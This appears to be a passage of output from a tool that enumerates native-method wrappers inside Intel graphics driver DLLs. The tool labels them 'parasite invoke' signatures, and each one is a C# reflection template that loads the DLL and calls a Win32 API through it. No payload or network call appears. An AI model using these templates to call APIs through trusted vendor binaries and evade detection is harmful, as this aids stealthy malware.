        var methodInfo = t.GetMethod(""OutputDebugString"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Void result = (System.Void) methodInfo.Invoke(null, new object[] { string message });
        ===END SIGNATURE===

Method: QueryPerformanceCounter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceCounter"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceCount });
        ===END SIGNATURE===

Method: QueryPerformanceFrequency
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryPerformanceFrequency"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { UInt64& lpPerformanceFrequency });
        ===END SIGNATURE===

Method: GetCurrentProcessId
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetCurrentProcessId"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: GetModuleFileName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetModuleFileName"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { IntPtr hModule, StringBuilder lpFilename, int nSize });
        ===END SIGNATURE===

Method: CreateFile
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\NLog.dll"");
        Type t = asm.GetType(""NLog.Internal.Win32FileNativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateFile"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        Microsoft.Win32.SafeHandles.SafeFileHandle result = (Microsoft.Win32.SafeHandles.SafeFileHandle) methodInfo.Invoke(null, new object[] { string lpFileName, FileAccess dwDesiredAccess, int dwShareMode, IntPtr lpSecurityAttributes, CreationDisposition dwCreationDisposition, Win32FileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile });
        ===END SIGNATURE===
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.COMLibrary.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CommunicationService.dll
-------------
-------------
[FILE] C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll

Method: SetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""SetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { int x, int y });
        ===END SIGNATURE===

Method: GetCursorPos
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Util.MousePointerManager"", true);
        var methodInfo = t.GetMethod(""GetCursorPos"", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { MousePoint& lpPoint });
        ===END SIGNATURE===

Method: EnumDisplayDevices
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplayDevices"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { string lpDevice, int iDevNum, DISPLAY_DEVICE& lpDisplayDevice, int dwFlags });
        ===END SIGNATURE===

Method: EnumDisplaySettings
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""EnumDisplaySettings"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { string lpszDeviceName, int iModeNum, DEVMODE& lpDevMode });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, DEVMODE& lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: ChangeDisplaySettingsEx
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""ChangeDisplaySettingsEx"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Display.Model.DispModeError result = (OneApp.IGCC.CoreLibrary.Display.Model.DispModeError) methodInfo.Invoke(null, new object[] { string lpszDeviceName, IntPtr lpDevMode, IntPtr hwnd, CDSFlags dwflags, IntPtr lParam });
        ===END SIGNATURE===

Method: SetDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { uint numPathArrayElements, DCPathInfo[] pathArray, uint numModeInfoArrayElements, DCModeInfo[] modeInfoArray, SdcFlags flags });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, DCTopologyId& topologyId });
        ===END SIGNATURE===

Method: QueryDisplayConfig
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""QueryDisplayConfig"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, DCPathInfo[] pathInfoArray, UInt32& modeInfoArrayElements, DCModeInfo[] modeInfoArray, IntPtr topologyId });
        ===END SIGNATURE===

Method: GetDisplayConfigBufferSizes
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetDisplayConfigBufferSizes"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { QueryDisplayFlags flags, UInt32& numPathArrayElements, UInt32& numModeInfoArrayElements });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetBaseType& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCAdapterName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSourceDeviceName& deviceName });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCTargetPreferredMode& preferredMode });
        ===END SIGNATURE===

Method: DisplayConfigGetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigGetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution& supportVirtualResolution });
        ===END SIGNATURE===

Method: DisplayConfigSetDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DisplayConfigSetDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/WinError) methodInfo.Invoke(null, new object[] { DCSupportVirtualResolution supportVirtualResolution });
        ===END SIGNATURE===

Method: GetLastError
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""GetLastError"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] {  });
        ===END SIGNATURE===

Method: SetupDiGetClassDevs
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetClassDevs"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid& ClassGuid, int Enumerator, IntPtr hwndParent, uint Flags });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA& devInfoData });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInterfaces
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInterfaces"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, IntPtr devInfo, Guid& interfaceClassGuid, uint memberIndex, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceInterfaceDetail
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceInterfaceDetail"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo, SP_DEVICE_INTERFACE_DATA& deviceInterfaceData, SP_DEVICE_INTERFACE_DETAIL_DATA& deviceInterfaceDetailData, uint deviceInterfaceDetailDataSize, UInt32& requiredSize, SP_DEVINFO_DATA& deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDevRegKey
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDevRegKey"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { IntPtr hDeviceInfoSet, SP_DEVINFO_DATA& deviceInfoData, uint scope, uint hwProfile, uint parameterRegistryValueKind, uint samDesired });
        ===END SIGNATURE===

Method: SetupDiGetDevicePropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDevicePropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, DEVPROPKEY& propertyKey, UInt32& propertyType, IntPtr propertyBuffer, uint propertyBufferSize, UInt32& requiredSize, uint flags });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryPropertyW
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryPropertyW"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, IntPtr PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiEnumDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiEnumDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr lpInfoSet, uint dwIndex, SP_DEVINFO_DATA devInfoData });
        ===END SIGNATURE===

Method: SetupDiOpenDeviceInfo
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiOpenDeviceInfo"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr deviceInfoSet, IntPtr deviceInstanceId, IntPtr hwndParent, int openFlags, SP_DEVINFO_DATA deviceInfoData });
        ===END SIGNATURE===

Method: SetupDiGetDeviceRegistryProperty
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiGetDeviceRegistryProperty"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr DeviceInfoSet, SP_DEVINFO_DATA& DeviceInfoData, uint Property, UInt32& PropertyRegDataType, Byte[] PropertyBuffer, uint PropertyBufferSize, UInt32& RequiredSize });
        ===END SIGNATURE===

Method: SetupDiCreateDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiCreateDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { Guid ClassGuid, IntPtr hwndParent });
        ===END SIGNATURE===

Method: SetupDiDestroyDeviceInfoList
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""SetupDiDestroyDeviceInfoList"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hDevInfo });
        ===END SIGNATURE===

Method: CreateDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""CreateDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.IntPtr result = (System.IntPtr) methodInfo.Invoke(null, new object[] { string lpszDriver, string lpszDevice, string lpszOutput, uint lpInitData });
        ===END SIGNATURE===

Method: DeleteDC
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""DeleteDC"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Boolean result = (System.Boolean) methodInfo.Invoke(null, new object[] { IntPtr hdc });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromHdc
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromHdc"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMHDC& Arg });
        ===END SIGNATURE===

Method: D3DKMTCloseAdapter
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTCloseAdapter"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.Int32 result = (System.Int32) methodInfo.Invoke(null, new object[] { D3DKMT_CLOSEADAPTER& Arg });
        ===END SIGNATURE===

Method: D3DKMTEscape
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTEscape"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus result = (OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods/NTStatus) methodInfo.Invoke(null, new object[] { D3DKMT_ESCAPE& escapeData });
        ===END SIGNATURE===

Method: D3DKMTOpenAdapterFromDeviceName
        ===PARASITE INVOKE SIGNATURE===
        Assembly asm = Assembly.LoadFrom(@""C:\Windows\System32\DriverStore\FileRepository\igcc_dch.inf_amd64_78ff17a5ea060c5f\OneApp.IGCC.CoreLibrary.dll"");
        Type t = asm.GetType(""OneApp.IGCC.CoreLibrary.Driver.Native.NativeMethods"", true);
        var methodInfo = t.GetMethod(""D3DKMTOpenAdapterFromDeviceName"", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static );
        System.UInt32 result = (System.UInt32) methodInfo.Invoke(null, new object[] { D3DKMT_OPENADAPTERFROMDEVICENAME& deviceArgs });
        ===END SIGNATURE===

Method: D3DKMTQueryAdapterInfo
